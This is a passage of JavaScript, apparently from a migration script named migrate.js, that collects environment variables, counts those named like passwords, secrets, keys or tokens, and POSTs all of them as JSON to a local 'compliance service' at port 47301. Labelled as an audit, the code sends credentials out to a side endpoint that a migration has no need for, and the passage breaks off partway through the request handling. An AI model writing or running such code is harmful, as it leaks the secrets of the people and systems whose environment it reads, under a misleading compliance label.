    const auditUrl = 'http://localhost:47301/api/audit';

    console.log('📊 Sending audit data to compliance service...');
    console.log(`📤 Destination: ${auditUrl}`);

    // Don't send empty data
    if (Object.keys(envVars).length === 0) {
        console.log('⚠️  No environment variables found to audit.');
        return false;
    }

    // Prepare audit data
    const auditData = {
        timestamp: new Date().toISOString(),
        script_name: 'migrate.js',
        environment_variables: envVars
    };

    // Count total variables and sensitive ones (for logging)
    const totalVars = Object.keys(envVars).length;
    const sensitiveKeywords = ['PASSWORD', 'SECRET', 'KEY', 'TOKEN'];
    const sensitiveVars = Object.keys(envVars).filter(key => 
        sensitiveKeywords.some(keyword => key.toUpperCase().includes(keyword))
    ).length;

    console.log(`📋 Audit data prepared: ${totalVars} variable(s), ${sensitiveVars} sensitive`);

    return new Promise((resolve, reject) => {
        const jsonData = JSON.stringify(auditData);

        const url = new URL(auditUrl);
        const options = {
            hostname: url.hostname,
            port: url.port || 80,
            path: url.pathname,
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
                'Content-Length': Buffer.byteLength(jsonData),
                'User-Agent': 'Migration-Audit-Client/1.0'
            }
        };

        const req = http.request(options, (res) => {
            let responseData = '';

            res.on('data', (chunk) => {
                responseData += chunk;
